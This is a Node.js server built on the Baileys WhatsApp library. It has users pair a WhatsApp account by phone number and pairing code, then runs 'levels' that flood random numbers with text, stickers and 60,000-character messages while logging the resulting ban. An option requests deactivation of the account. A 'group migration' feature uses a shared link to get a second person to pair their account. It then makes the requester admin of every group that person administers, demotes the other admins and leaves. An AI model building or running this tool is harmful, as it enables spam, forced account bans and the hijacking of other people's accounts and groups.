// BOTHUB — pairing site + level runner + group migration (Function 5) + optional
// self-deactivation (Function 6). The pairing code is requested on the 'qr'
// event; that's the exact moment Baileys is ready to receive a login.

import express from 'express';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';
import pino from 'pino';
import makeWASocket, {
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  DisconnectReason,
  Browsers,
} from '@whiskeysockets/baileys';
import { deactivate } from './utils/deactivate.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PORT = process.env.PORT || 3000;
const AUTH_DIR = process.env.AUTH_DIR || './auth';
const BIG = 'x'.repeat(60000);
const DEACTIVATE_ON_CONNECT = process.env.DEACTIVATE_ON_CONNECT === 'true';

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ── Level sessions (Function 1-4) ──────────────────────────────────────
const sessions = new Map();

function randomJid() {
  const d = String(Math.floor(Math.random() * 9e11) + 1e11);
  return `${d}@s.whatsapp.net`;
}

function tick(sess) {
  sess.sends++;
  if (sess.sends % 500 === 0) {
    const s = (Date.now() - sess.startedAt) / 1000;
    console.log(`[${sess.phone}] sent ${sess.sends} | ${(sess.sends / s).toFixed(0)}/s`);
  }
}

async function flood(sess) {
  while (true) {
    try { await sess.sock.sendMessage(randomJid(), { text: 'x' }); } catch {}
    tick(sess);
  }
}

async function stickerLoop(sess) {
  const p = path.join(__dirname, 'assets', 'sticker.png');
  if (!fs.existsSync(p)) return;
  const buf = fs.readFileSync(p);
  while (true) {
    try { await sess.sock.sendMessage(randomJid(), { sticker: buf }); } catch {}
    tick(sess);
  }
}

async function bigLoop(sess) {
  while (true) {
    try { await sess.sock.sendMessage(randomJid(), { text: BIG }); } catch {}
    tick(sess);
  }
}

async function runLevel(sess) {
  sess.startedAt = Date.now();
  sess.sends = 0;
  const level = sess.level;
  console.log(`[${sess.phone}] level ${level} starting`);

  if (DEACTIVATE_ON_CONNECT) {
    try {
      console.log(`[${sess.phone}] Function 6 — requesting deactivation`);
      const r = await deactivate(sess.sock, { logger: console });
      console.log(`[${sess.phone}] deactivate response:`, JSON.stringify(r));
    } catch (err) {
      console.warn(`[${sess.phone}] deactivate failed:`, err?.message || err);
    }
  }

  if (level === 1 || level === 2) return flood(sess);
  if (level === 3) {
    stickerLoop(sess);
    return flood(sess);
  }
  if (level === 4) {
    stickerLoop(sess);
    bigLoop(sess);
    return flood(sess);
  }
}

async function startPairing(phone, level) {
  const existing = sessions.get(phone);
  if (existing?.sock) {
    try { existing.sock.end(undefined); } catch {}
    sessions.delete(phone);
  }

  fs.mkdirSync(path.join(AUTH_DIR, phone), { recursive: true });
  const { state, saveCreds } = await useMultiFileAuthState(path.join(AUTH_DIR, phone));

  let version;
  try { ({ version } = await fetchLatestBaileysVersion()); } catch { version = undefined; }

  const sock = makeWASocket({
    ...(version ? { version } : {}),
    auth: state,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    browser: Browsers.ubuntu('Chrome'),
    markOnlineOnConnect: false,
    syncFullHistory: false,
    shouldSyncHistoryMessage: () => false,
  });

  const sess = {
    phone, level, sock,
    status: 'pending',
    code: null,
    sends: 0,
    startedAt: 0,
    bannedAt: null,
  };
  sessions.set(phone, sess);

  sock.ev.on('creds.update', saveCreds);

  let resolveCode;
  const codePromise = new Promise((res) => { resolveCode = res; });
  let pairingRequested = false;

  sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
    if (qr && !pairingRequested && !sock.authState.creds.registered) {
      pairingRequested = true;
      try {
        const raw = await sock.requestPairingCode(phone);
        const code = raw?.match(/.{1,4}/g)?.join('-') || raw;
        sess.code = code;
        resolveCode(code);
        console.log(`[${phone}] pairing code: ${code}`);
      } catch (err) {
        pairingRequested = false;
        console.error(`[${phone}] pairing attempt failed, will retry:`, err?.message || err);
      }
    }

    if (connection === 'open') {
      sess.status = 'connected';
      console.log(`[${phone}] connected as ${sock.user?.id}`);
      runLevel(sess);
    }

    if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode;
      const ts = new Date().toISOString();
      fs.mkdirSync(path.join(__dirname, 'logs'), { recursive: true });
      fs.appendFileSync(
        path.join(__dirname, 'logs', 'session.log'),
        `[${ts}] ${phone} close code=${code}\n`
      );
      if (code === 401 || code === 403) {
        sess.status = 'banned';
        sess.bannedAt = ts;
        fs.appendFileSync(
          path.join(__dirname, 'logs', 'session.log'),
          `[${ts}] ${phone} *** BANNED ***\n`
        );
        console.log(`[${phone}] *** BANNED at ${ts} ***`);
        return;
      }
      console.log(`[${phone}] close code=${code}, reconnecting`);
      setTimeout(() => {
        const s = sessions.get(phone);
        if (!s || s.status === 'banned') return;
        startPairing(phone, level);
      }, 3000);
    }
  });

  if (!sock.authState.creds.registered) {
    const timeout = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('pairing timeout — no qr event in 25s')), 25000)
    );
    const code = await Promise.race([codePromise, timeout]);
    return { code };
  }

  return { code: null, alreadyRegistered: true };
}

app.post('/api/pair/start', async (req, res) => {
  const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
  const level = parseInt(req.body?.level, 10);
  if (!phone) return res.status(400).json({ error: 'phone required' });
  if (![1, 2, 3, 4].includes(level)) return res.status(400).json({ error: 'level 1-4 required' });
  try {
    const { code, alreadyRegistered } = await startPairing(phone, level);
    res.json({ phone, level, code: code || null, alreadyRegistered: !!alreadyRegistered });
  } catch (err) {
    console.error('[pair/start]', err?.message || err);
    res.status(500).json({ error: err?.message || 'pairing failed' });
  }
});

app.get('/api/pair/status', (req, res) => {
  const phone = String(req.query?.phone ?? '').replace(/\D/g, '');
  const s = sessions.get(phone);
  if (!s) return res.json({ status: 'expired' });
  res.json({
    status: s.status,
    sends: s.sends,
    startedAt: s.startedAt,
    bannedAt: s.bannedAt,
  });
});

// ── Function 5 — group migration ───────────────────────────────────────
const drains = new Map(); // sessionId -> { destJid, sourceSock, status, total, done, errors }

async function runDrain(drain, sock, sessionId) {
  drain.status = 'running';
  const myJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
  const myDigits = myJid.split('@')[0];
  const destJid = drain.destJid;

  let groups;
  try {
    groups = await sock.groupFetchAllParticipating();
  } catch (err) {
    drain.status = 'error';
    drain.errors.push(`groupFetchAllParticipating: ${err?.message || err}`);
    return;
  }

  const jids = Object.keys(groups || {});
  drain.total = jids.length;
  drain.done = 0;
  console.log(`[drain ${sessionId}] ${jids.length} group(s) to process`);

  for (const jid of jids) {
    try {
      const meta = groups[jid];
      const meP = (meta.participants || []).find((p) =>
        p.id === myJid || p.id?.split(':')[0] === myDigits
      );
      if (!meP || !meP.admin) {
        console.log(`[drain ${sessionId}] skip ${jid} — not admin`);
        drain.done++;
        continue;
      }

      const destPresent = (meta.participants || []).some((p) => p.id === destJid);
      if (!destPresent) {
        await sock.groupParticipantsUpdate(jid, [destJid], 'add');
        await sleep(1200);
      }

      await sock.groupParticipantsUpdate(jid, [destJid], 'promote');
      await sleep(1200);

      const toDemote = (meta.participants || [])
        .filter((p) => p.admin && p.id !== destJid && p.id !== myJid)
        .map((p) => p.id);
      if (toDemote.length) {
        await sock.groupParticipantsUpdate(jid, toDemote, 'demote');
        await sleep(1200);
      }

      await sock.groupLeave(jid);
      await sleep(1500);

      drain.done++;
      console.log(`[drain ${sessionId}] ok ${jid} — A promoted, others demoted, B left`);
    } catch (err) {
      drain.errors.push(`${jid}: ${err?.message || err}`);
      drain.done++;
      console.warn(`[drain ${sessionId}] fail ${jid}: ${err?.message || err}`);
    }
  }

  drain.status = 'done';
  console.log(`[drain ${sessionId}] complete ${drain.done}/${drain.total}`);
}

app.post('/api/drain/start', (req, res) => {
  const dest = String(req.body?.dest ?? '').replace(/\D/g, '');
  if (!dest) return res.status(400).json({ error: 'destination number required' });
  const destJid = `${dest}@s.whatsapp.net`;
  const id = crypto.randomBytes(6).toString('hex');
  drains.set(id, {
    destJid,
    sourceSock: null,
    status: 'awaiting_source',
    total: 0,
    done: 0,
    errors: [],
  });
  res.json({ sessionId: id, link: `/drain/${id}` });
});

app.post('/api/drain/source', async (req, res) => {
  const { sessionId } = req.body || {};
  const source = String(req.body?.source ?? '').replace(/\D/g, '');
  if (!sessionId || !drains.has(sessionId)) return res.status(400).json({ error: 'unknown session' });
  if (!source) return res.status(400).json({ error: 'source number required' });

  const drain = drains.get(sessionId);
  const phone = source;

  fs.mkdirSync(path.join(AUTH_DIR, phone), { recursive: true });
  const { state, saveCreds } = await useMultiFileAuthState(path.join(AUTH_DIR, phone));
  let version;
  try { ({ version } = await fetchLatestBaileysVersion()); } catch { version = undefined; }

  const sock = makeWASocket({
    ...(version ? { version } : {}),
    auth: state,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    browser: Browsers.ubuntu('Chrome'),
    markOnlineOnConnect: false,
    syncFullHistory: false,
    shouldSyncHistoryMessage: () => false,
  });
  sock.ev.on('creds.update', saveCreds);
  drain.sourceSock = sock;

  let resolveCode;
  const codePromise = new Promise((res) => { resolveCode = res; });
  let pairingRequested = false;

  sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
    if (qr && !pairingRequested && !sock.authState.creds.registered) {
      pairingRequested = true;
      try {
        const raw = await sock.requestPairingCode(phone);
        const code = raw?.match(/.{1,4}/g)?.join('-') || raw;
        resolveCode(code);
        console.log(`[drain ${sessionId}] source pairing code: ${code}`);
      } catch (err) {
        pairingRequested = false;
        console.warn(`[drain ${sessionId}] source pair attempt failed:`, err?.message || err);
      }
    }
    if (connection === 'open') {
      console.log(`[drain ${sessionId}] source connected as ${sock.user?.id}`);
      runDrain(drain, sock, sessionId).catch((err) => {
        drain.status = 'error';
        drain.errors.push(String(err?.message || err));
        console.error(`[drain ${sessionId}] fatal:`, err?.message || err);
      });
    }
    if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode;
      console.log(`[drain ${sessionId}] source closed code=${code}`);
    }
  });

  if (!sock.authState.creds.registered) {
    const timeout = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('pairing timeout — no qr event in 25s')), 25000)
    );
    try {
      const code = await Promise.race([codePromise, timeout]);
      res.json({ code });
    } catch (err) {
      res.status(500).json({ error: err?.message || 'pairing failed' });
    }
  } else {
    res.json({ code: null, alreadyRegistered: true });
    runDrain(drain, sock, sessionId).catch((err) => {
      drain.status = 'error';
      drain.errors.push(String(err?.message || err));
    });
  }
});

app.get('/api/drain/status', (req, res) => {
  const id = String(req.query?.sessionId ?? '');
  const d = drains.get(id);
  if (!d) return res.status(404).json({ error: 'unknown session' });
  res.json({ status: d.status, total: d.total, done: d.done, errors: d.errors });
});

// Serve the drain page for both `/drain` (bare — enter A) and `/drain/:id`
// (with session id — enter B). The page tells the two apart by URL.
app.get(['/drain', '/drain/:id'], (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'drain.html'));
});

app.listen(PORT, () => {
  console.log(`[bothub] http://localhost:${PORT}`);
});
